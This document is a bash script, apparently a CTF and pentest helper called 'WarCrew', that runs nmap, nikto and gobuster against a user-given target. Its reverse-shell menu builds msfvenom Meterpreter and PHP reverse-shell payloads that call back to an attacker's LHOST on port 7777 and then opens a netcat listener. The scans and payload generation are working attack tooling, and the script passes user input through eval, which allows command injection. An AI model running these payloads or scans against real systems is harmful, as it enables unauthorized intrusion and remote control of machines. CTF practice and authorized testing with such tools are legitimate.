#!/bin/bash

# WarCrew Swiss army knife Tool
# Everything you need to solve and doc your incoming CTF.
# This script is designed to assist with CTFs and ethical hacking.
# Version 2 - Automated revrese shells, New approch to handle, fixed flags to all commands.
# Work on notes for the CTF
# Fixing the issue with the locked dir with chown $SUDO_USER
# issue with the resualt of gobuster - Fixing it with "tee" and changed the tee method to all commands. so the user dont be leave in the dark.
# tee -a to append and not overight.

# Function For Welcome Screen
display_welcome_banner() {
    echo "---------------------------------"
    echo "Welcome to WarCrew Scanning Tool"
    echo "The tool uses different methods to help you find the right way"
    echo "Be safe and don't cause any harm with this tool"

    cat << "EOF"
//////////////////////////////////////////////////////////
    __          __         _____                   
    \ \        / /        / ____|                  
     \ \  /\  / /_ _ _ __| |     _ __ _____      __
      \ \/  \/ / _` | '__| |    | '__/ _ \ \ /\ / /
       \  /\  / (_| | |  | |____| | |  __/\ V  V / 
        \/  \/ \__,_|_|   \_____|_|  \___| \_/\_/ 
        
/////////////////////////////////////////////////////////

EOF
}

# Function to handle errors
handle_error() {
    local error_message="$1"
    echo "Something went wrong: $error_message"
}

# Check root function
check_root() {
    if [ "$EUID" -ne 0 ]; then
        handle_error "This script may require root privileges for some scans. Please run it as root or with sudo."
        exit 0
    fi
}

# Function for CTF directory block
creating_directory() {
    read -p "Enter CTF name: " ctf
    desktop_dir="/home/$SUDO_USER/Desktop"
    ctf_dir="$desktop_dir/$ctf"

    if [ -d "$ctf_dir" ]; then
        handle_error "CTF directory '$ctf' already exists on the desktop. You can keep working on you'r CTF."
        return 1
    fi

mkdir -p "$ctf_dir" || { handle_error "Failed to create CTF directory."; return 1; }
log_dir="$ctf_dir/logs"
mkdir -p "$log_dir" || { handle_error "Failed to create Log directory."; return 1; }

# Chaning ownership of the dir
chown -R $SUDO_USER:$SUDO_USER "$ctf_dir"

}

# Function to generate timestamp
generate_timestamp() {
    ts=$(date "+%d-%m-%Y")
}

# Function to get target information from the user
get_target() {
    read -p "Enter IP target or hostname: " target

    # Handling Error if target is blank. -z to check if $target holds anything.
    if [ -z "$target" ]; then
        handle_error "Target IP or hostname cannot be empty."
        return 1
    fi
}

edit_notes() {
    notes_file="$ctf_dir/notes.txt"

    # Check if the notes file exists, if not, create it
    if [ ! -f "$notes_file" ]; then
        touch "$notes_file"
    fi

    # Open the notes file with nano for editing
    nano "$notes_file"
    
    echo "Notes updated. You can find them in '$notes_file'."
}

# This Funcation running Nmap
nmap_scan() {

    nmap_log="$log_dir/nmap_scan_$ts.txt"
    
    echo "---------------------------------"
    echo "Select Nmap scan type:"
    echo "1. Quick Scan"
    echo "2. Aggressive-Long Scan"
    echo "3. Quiet Scan"
    echo "4. Vuln Scan"
    echo "5. Version Scan"
    read -p "Enter your choice (1-5): " nmap_scan_type

    echo "Starting Nmap scan. Please wait..."

    # Cheking if the user looking for quite or aggresive scan
    if [ "$nmap_scan_type" == "1" ]; then
        nmap_command="nmap -A -T4 -vvv $target"
    elif [ "$nmap_scan_type" == "2" ]; then
        nmap_command="nmap -sCVT -Pn -T4 -p- -v -A $target"
    elif [ "$nmap_scan_type" == "3" ]; then
    	nmap_command="nmap -sS -T1 -vvv $target"
    elif [ "$nmap_scan_type" == "4" ]; then
    	nmap_command="nmap --script=vuln -v $target"
    elif [ "$nmap_scan_type" == "5" ]; then
    	nmap_command="nmap -sV -A -v $target"
    else
        echo "Invalid choice. Defaulting to Quick Scan."
        nmap_command="nmap -A -T4 $target"
    fi

    echo -e "Starting Nmap scan. Using the following command: \n$nmap_command"

    # Run Nmap command directly to the shell and log the output with errors.
    eval "$nmap_command" 2>&1 | tee -a "$nmap_log"
    
    echo "---------------------------------"
    echo "Nmap scan completed. Results are saved in '$nmap_log'."
    echo "---------------------------------"
}

# This Function running Nikto
nikto_scan() {
    echo "Running Nikto scan..."
    read -p "Do you want to perform an SSL scan? (Y/N): " ssl_scan
    read -p "Do you want to perform an authenticated scan? (Y/N): " auth_scan

    # Creating a var for auth_scan
    auth_credentials=""

    # Nikto log file
    nikto_log="$log_dir/nikto_scan_$ts.txt"

    nikto_command="nikto -h $target -output $nikto_log -ask no"

    # Cheking if the user looking diffrent kind of options nikto has to offer and use them
    if [ "$ssl_scan" == "Y" ]; then
        nikto_command="$nikto_command -ssl"
    fi

    if [ "$auth_scan" == "Y" ]; then
        read -p "Enter authentication (username:password): " auth_credentials
        nikto_command="$nikto_command -id $auth_credentials"
    fi

    echo -e "Running Nikto with the following command: \n$nikto_command"

    eval "$nikto_command" 2>&1 | tee -a "$nikto_log"
    
    echo "---------------------------------"
    echo "Nikto scan completed. Results are saved in '$nikto_log'."
    echo "---------------------------------"
}

# Gobuster Dir scans, Basic + Aggresive with extions for usful files.
# Note to self: Add a way to search inside the target content
gobuster_scan() {
    echo "Select GoBuster scan type:"
    echo "1. Quick Scan"
    echo "2. Aggressive Scan"
    read -p "Enter your choice (1/2): " gobuster_scan_type

    # Wordlist path
    read -p "Enter the path to the wordlist (Or empty for default): " wordlist_path
    if [ -z "$wordlist_path" ]; then
        # Default wordlist path for Kali Linux
        wordlist_path="/usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt"
    fi

    # Check if the wordlist file exists
    if [ ! -f "$wordlist_path" ]; then
        echo "Wordlist file does not exist at '$wordlist_path'."
        return 1
    fi

    # GoBuster log file
    gobuster_log="$log_dir/gobuster_scan_$ts.txt"

    # Determine GoBuster command based on scan type
    if [ "$gobuster_scan_type" = "1" ]; then
        gobuster_command="gobuster dir -u $target -w $wordlist_path -o $gobuster_log"
    elif [ "$gobuster_scan_type" = "2" ]; then
        gobuster_command="gobuster dir -u $target -w $wordlist_path -o $gobuster_log -t 50 -x .html,.css,.js,.php,.py,.log,.cgi,.txt,.sh -r 0 -q"
    else
        echo "Invalid choice."
        return 1
    fi

    # Execute GoBuster command
    echo -e "Starting GoBuster scan. Using the following command: \n$gobuster_command"
    eval "$gobuster_command" 2>&1 | tee -a "$gobuster_log"
    
    echo "---------------------------------"
    echo "GoBuster scan completed. Results are saved in '$gobuster_log'."
}

network_investigation() {
	network_inv_logfile="$log_dir/network_investigation_$ts.txt"
	
	echo "Performing Ping, Traceroute, Whois lookup, Dig to give you some info about $target"
	ping -c 4 $target 2>&1 | tee -a "$network_inv_logfile"
	traceroute $target 2>&1 | tee -a "$network_inv_logfile"
	whois $target 2>&1 | tee -a "$network_inv_logfile"
	dig $target 2>&1 | tee -a "$network_inv_logfile"
	echo "---------------------------------"
	echo "Thank you, All the data had been save into your log direcotry."
	echo "---------------------------------"
}

# NetCat funcion to be called on the Revrese shell menu and open new tab shell
netcat_listener() {
	gnome-terminal --tab -- /bin/sh -c 'netcat -lvp 7777; exec bash'
}

# Getting reverse shell auto

reverse_shell() {
	cat << "EOF"
 __      __ __      __       __      __                        
 \ \    / / \ \    / /       \ \    / /                        
  \ \  / /__ \ \  / /__ _ __  \ \  / /__ _ __   ___  _ __ ___  
   \ \/ / _ \ \ \/ / _ \ '_ \  \ \/ / _ \ '_ \ / _ \| '_ ` _ \ 
    \  /  __/_ \  /  __/ | | |_ \  /  __/ | | | (_) | | | | | |
     \/ \___(_|_)/ \___|_| |_(_|_)/ \___|_| |_|\___/|_| |_| |_|
     
//////////////////////////////////////////////////
     
EOF
                                                                                                                            
	echo "So...You need a shell."
    sleep 1
	read -p "Enter You'r LHOST: " LHOST
	echo "Defualt LPORT set to: 7777"
    echo "The script will open NetCat on port 7777 in new tab for you"
	read -p "Do you need Staged or Stageless shell?(1/2): " shell_class
	
    #Staged Shells
	if [ "$shell_class" = "1" ]; then
        echo "---------------------------------"
        echo "1. PHP shell"
        echo "2. Windows Meterepter shell"
        read -p "Choose the shell type: " shell_type
        if [ "$shell_type" = "1" ]; then # PHP
	        msfvenom_command="msfvenom -p php/meterpreter/reverse_tcp LHOST=$LHOST LPORT=7777 -f raw > \"$ctf_dir/shell.php\""
        elif [ "$shell_type" = "2" ]; then	
            msfvenom_command="msfvenom -p windows/meterpreter/reverse_tcp LHOST=$LHOST LPORT=7777 -f exe > \"$ctf_dir/shell.exe\""
        else
            handle_error "Invalid Choice"
            return 1
        fi

        eval "$msfvenom_command"
        echo "Payload generated successfully."

    # Stageless Shells
    elif [ "$shell_class" = "2" ]; then
        echo "---------------------------------"
        echo "1. PHP shell"
        echo "2. Windows Meterepter shell"
        read -p "Choose the shell type: " shell_type

        if [ "$shell_type" = "1" ]; then # PHP
	        msfvenom_command="msfvenom -p php/reverse_php LHOST=$LHOST LPORT=7777 -f raw > \"$ctf_dir/stageless_shell.php\""
        elif [ "$shell_type" = "2" ]; then	
            msfvenom_command="msfvenom -p windows/meterpreter_reverse_tcp LHOST=$LHOST LPORT=7777 -f exe > \"$ctf_dir/stageless_meterpreter.exe\""
        else
            handle_error "Invalid Choice"
            return 1
        fi

        eval "$msfvenom_command"
        echo "Payload generated successfully."
    
    else
        handle_error "Invalid Choice"
        return 1
    fi

    echo "---------------------------------"
    echo "Opening NetCat listner in Port: 7777"
    echo "Happy-Hacking"
    echo "---------------------------------"
    netcat_listener
    goodbye
}


goodbye() {
	echo "Thank you for using WarCrew Scanning Tool. You have all the logs in your CTF directory"

	cat << "EOF"
//////////////////////////////////////////////////
____               ____             
| __ ) _   _  ___  | __ ) _   _  ___ 
|  _ \| | | |/ _ \ |  _ \| | | |/ _ \
| |_) | |_| |  __/ | |_) | |_| |  __/
|____/ \__, |\___| |____/ \__, |\___|
       |___/              |___/      
EOF

	read -n 1 -s -r -p "Press any key to exit..."
    echo
	return 0
}

# Main script execution

prompt_and_execute() {
    local choice=$1
    case $choice in
        1) get_target && return 0 || return 1 ;;
        2) edit_notes && return 0 || return 1 ;;
        3) nmap_scan && return 0 || return 1 ;;
        4) gobuster_scan && return 0 || return 1 ;;
        5) nikto_scan && return 0 || return 1 ;;
        6) network_investigation && return 0 ;;
        7) reverse_shell && return 0 || return 1 ;;
        8) goodbye ;;
        *) echo "Invalid choice. Please enter a number between 1 and 8." && return 1 ;;
    esac
}

display_welcome_banner
check_root
creating_directory
generate_timestamp
get_target

main_menu() {

    while true; do
        echo "---------------------------------"
        echo "Choose a function to run:"
        echo "1. Change Target IP/Hostname"
        echo "2. Edit Notes"
        echo "3. Nmap Scan"
        echo "4. GoBuster Scan"
        echo "5. Nikto Scan"
        echo "6. Network Investigation"
        echo "7. Revrese Shells"
        echo "8. Exit"

        read -p "Enter your choice (1-8): " user_choice

        # If input is empty and not equal to 1-8
        # Needed to be edited with every new funcion added to the script
        
        if [[ -z "$user_choice" ]] || ! [[ "$user_choice" =~ ^[1-8]$ ]]; then
            echo "---------------------------------"
            echo "Invalid choice. Please enter a number between 1 and 8."
            continue  
        fi

        # Core block
        # Handle errors for prompt_and_ececute command
        # Try to execute the choice and repeat
        # ! Getting the status code of the prompt_and_execute function and inverts it.

        if ! prompt_and_execute $user_choice; then
            echo "---------------------------------"
            echo "An error occurred. Please try again."
        fi

        if [ "$user_choice" -eq 8 ]; then
            break
        fi
    done
}

main_menu